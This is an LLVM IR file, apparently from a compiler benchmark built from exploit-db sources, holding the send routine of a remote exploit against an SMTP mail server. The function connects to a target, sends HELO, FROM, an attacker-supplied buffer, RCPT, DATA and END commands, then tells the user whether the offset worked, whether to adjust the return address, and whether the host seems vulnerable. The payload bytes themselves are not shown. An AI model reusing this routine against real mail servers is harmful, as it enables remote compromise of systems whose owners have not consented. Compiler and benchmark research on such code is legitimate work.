; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_24093.c_xp_send.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_24093.c_xp_send.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i64 }

@BUFSIZ = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [32 x i8] c"[-] Can't connect to target %s\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [16 x i8] c"[+] Connected.\0A\00", align 1
@HELO = common dso_local global i8* null, align 8
@FROM = common dso_local global i8* null, align 8
@RCPT = common dso_local global i8* null, align 8
@DATA = common dso_local global i8* null, align 8
@END = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [47 x i8] c"[+] Offset seems good ! if the next hit fails\0A\00", align 1
@.str.3 = private unnamed_addr constant [48 x i8] c"[+] try to decrement THIS adddress by 5 or 10!\0A\00", align 1
@opt_flags = common dso_local global i32 0, align 4
@OPT_CHECK = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [26 x i8] c"[+] Host seams vulnable!\0A\00", align 1
@.str.5 = private unnamed_addr constant [27 x i8] c"[-] Host is not vulnable!\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@QUIT = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @xp_send(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %16 = load i32, i32* @BUFSIZ, align 4
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %9, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %10, align 8
  %20 = load i8*, i8** %5, align 8
  %21 = load i32, i32* %6, align 4
  %22 = call i32 @connect_host(i8* %20, i32 %21)
  store i32 %22, i32* %8, align 4
  %23 = load i32, i32* %8, align 4
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

25:                                               ; preds = %3
  %26 = load i32, i32* @stderr, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = call i32 (i32, i8*, ...) @fprintf(i32 %26, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0), i8* %27)
  %29 = load i32, i32* @EXIT_FAILURE, align 4
  %30 = call i32 @exit(i32 %29) #4
  unreachable

31:                                               ; preds = %3
  %32 = load i32, i32* @stdout, align 4
  %33 = call i32 (i32, i8*, ...) @fprintf(i32 %32, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  br label %34

34:                                               ; preds = %31
  %35 = load i32, i32* @BUFSIZ, align 4
  %36 = call i32 @memset(i8* %19, i32 0, i32 %35)
  %37 = load i32, i32* @BUFSIZ, align 4
  %38 = call i32 @memset(i8* %19, i32 0, i32 %37)
  %39 = load i32, i32* %8, align 4
  %40 = trunc i64 %17 to i32
  %41 = call i32 @recv(i32 %39, i8* %19, i32 %40, i32 0)
  store i32 %41, i32* %14, align 4
  %42 = load i32, i32* @BUFSIZ, align 4
  %43 = call i32 @memset(i8* %19, i32 0, i32 %42)
  %44 = load i32, i32* %8, align 4
  %45 = load i8*, i8** @HELO, align 8
  %46 = load i8*, i8** @HELO, align 8
  %47 = call i32 @strlen(i8* %46)
  %48 = call i32 @send(i32 %44, i8* %45, i32 %47, i32 0)
  store i32 %48, i32* %14, align 4
  %49 = load i32, i32* %8, align 4
  %50 = trunc i64 %17 to i32
  %51 = call i32 @recv(i32 %49, i8* %19, i32 %50, i32 0)
  store i32 %51, i32* %14, align 4
  %52 = load i32, i32* @BUFSIZ, align 4
  %53 = call i32 @memset(i8* %19, i32 0, i32 %52)
  %54 = load i32, i32* %8, align 4
  %55 = load i8*, i8** @FROM, align 8
  %56 = load i8*, i8** @FROM, align 8
  %57 = call i32 @strlen(i8* %56)
  %58 = call i32 @send(i32 %54, i8* %55, i32 %57, i32 0)
  store i32 %58, i32* %14, align 4
  %59 = load i32, i32* %8, align 4
  %60 = load i8*, i8** %7, align 8
  %61 = load i8*, i8** %7, align 8
  %62 = call i32 @strlen(i8* %61)
  %63 = call i32 @send(i32 %59, i8* %60, i32 %62, i32 0)
  store i32 %63, i32* %14, align 4
  %64 = load i32, i32* %8, align 4
  %65 = trunc i64 %17 to i32
  %66 = call i32 @recv(i32 %64, i8* %19, i32 %65, i32 0)
  store i32 %66, i32* %14, align 4
  %67 = load i32, i32* @BUFSIZ, align 4
  %68 = call i32 @memset(i8* %19, i32 0, i32 %67)
  %69 = load i32, i32* %8, align 4
  %70 = load i8*, i8** @RCPT, align 8
  %71 = load i8*, i8** @RCPT, align 8
  %72 = call i32 @strlen(i8* %71)
  %73 = call i32 @send(i32 %69, i8* %70, i32 %72, i32 0)
  store i32 %73, i32* %14, align 4
  %74 = load i32, i32* %8, align 4
  %75 = trunc i64 %17 to i32
  %76 = call i32 @recv(i32 %74, i8* %19, i32 %75, i32 0)
  store i32 %76, i32* %14, align 4
  %77 = call i32 @FD_ZERO(i32* %12)
  %78 = load i32, i32* %8, align 4
  %79 = call i32 @FD_SET(i32 %78, i32* %12)
  %80 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i32 7, i32* %80, align 8
  %81 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %81, align 8
  %82 = load i32, i32* @BUFSIZ, align 4
  %83 = call i32 @memset(i8* %19, i32 0, i32 %82)
  %84 = load i32, i32* %8, align 4
  %85 = load i8*, i8** @DATA, align 8
  %86 = load i8*, i8** @DATA, align 8
  %87 = call i32 @strlen(i8* %86)
  %88 = call i32 @send(i32 %84, i8* %85, i32 %87, i32 0)
  store i32 %88, i32* %14, align 4
  %89 = load i32, i32* %8, align 4
  %90 = add nsw i32 %89, 1
  %91 = call i32 @select(i32 %90, i32* %12, i32* null, i32* null, %struct.timeval* %11)
  %92 = load i32, i32* %8, align 4
  %93 = call i64 @FD_ISSET(i32 %92, i32* %12)
  %94 = icmp ne i64 %93, 0
  br i1 %94, label %95, label %99

95:                                               ; preds = %34
  %96 = load i32, i32* %8, align 4
  %97 = trunc i64 %17 to i32
  %98 = call i32 @recv(i32 %96, i8* %19, i32 %97, i32 0)
  store i32 %98, i32* %14, align 4
  br label %102

99:                                               ; preds = %34
  %100 = load i32, i32* %8, align 4
  %101 = call i32 @close(i32 %100)
  store i32 -1, i32* %4, align 4
  store i32 1, i32* %15, align 4
  br label %161

102:                                              ; preds = %95
  %103 = call i32 @FD_ZERO(i32* %12)
  %104 = load i32, i32* %8, align 4
  %105 = call i32 @FD_SET(i32 %104, i32* %12)
  %106 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i32 7, i32* %106, align 8
  %107 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %107, align 8
  %108 = load i32, i32* @BUFSIZ, align 4
  %109 = call i32 @memset(i8* %19, i32 0, i32 %108)
  %110 = load i32, i32* %8, align 4
  %111 = load i8*, i8** @END, align 8
  %112 = load i8*, i8** @END, align 8
  %113 = call i32 @strlen(i8* %112)
  %114 = call i32 @send(i32 %110, i8* %111, i32 %113, i32 0)
  store i32 %114, i32* %14, align 4
  %115 = load i32, i32* %8, align 4
  %116 = add nsw i32 %115, 1
  %117 = call i32 @select(i32 %116, i32* %12, i32* null, i32* null, %struct.timeval* %11)
  %118 = load i32, i32* %8, align 4
  %119 = call i64 @FD_ISSET(i32 %118, i32* %12)
  %120 = icmp ne i64 %119, 0
  br i1 %120, label %128, label %121

121:                                              ; preds = %102
  %122 = load i32, i32* @stdout, align 4
  %123 = call i32 (i32, i8*, ...) @fprintf(i32 %122, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.2, i64 0, i64 0))
  %124 = load i32, i32* @stdout, align 4
  %125 = call i32 (i32, i8*, ...) @fprintf(i32 %124, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.3, i64 0, i64 0))
  %126 = load i32, i32* %8, align 4
  %127 = call i32 @close(i32 %126)
  store i32 -1, i32* %4, align 4
  store i32 1, i32* %15, align 4
  br label %161

128:                                              ; preds = %102
  %129 = load i32, i32* %8, align 4
  %130 = trunc i64 %17 to i32
  %131 = call i32 @recv(i32 %129, i8* %19, i32 %130, i32 0)
  store i32 %131, i32* %14, align 4
  %132 = load i32, i32* @opt_flags, align 4
  %133 = load i32, i32* @OPT_CHECK, align 4
  %134 = and i32 %132, %133
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %136, label %152

136:                                              ; preds = %128
  %137 = getelementptr inbounds i8, i8* %19, i64 0
  %138 = load i8, i8* %137, align 16
  %139 = sext i8 %138 to i32
  %140 = icmp eq i32 %139, 0
  br i1 %140, label %141, label %144

141:                                              ; preds = %136
  %142 = load i32, i32* @stdout, align 4
  %143 = call i32 (i32, i8*, ...) @fprintf(i32 %142, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0))
  br label %147

144:                                              ; preds = %136
  %145 = load i32, i32* @stdout, align 4
  %146 = call i32 (i32, i8*, ...) @fprintf(i32 %145, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0))
  br label %147

147:                                              ; preds = %144, %141
  %148 = load i32, i32* %8, align 4
  %149 = call i32 @close(i32 %148)
  %150 = load i32, i32* @EXIT_SUCCESS, align 4
  %151 = call i32 @exit(i32 %150) #4
  unreachable

152:                                              ; preds = %128
  %153 = load i32, i32* %8, align 4
  %154 = load i8*, i8** @QUIT, align 8
  %155 = load i8*, i8** @QUIT, align 8
  %156 = call i32 @strlen(i8* %155)
  %157 = call i32 @send(i32 %153, i8* %154, i32 %156, i32 0)
  store i32 %157, i32* %14, align 4
  %158 = load i32, i32* %8, align 4
  %159 = call i32 @close(i32 %158)
  %160 = load i32, i32* %14, align 4
  store i32 %160, i32* %4, align 4
  store i32 1, i32* %15, align 4
  br label %161

161:                                              ; preds = %152, %121, %99
  %162 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %162)
  %163 = load i32, i32* %4, align 4
  ret i32 %163
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @connect_host(i8*, i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @select(i32, i32*, i32*, i32*, %struct.timeval*) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
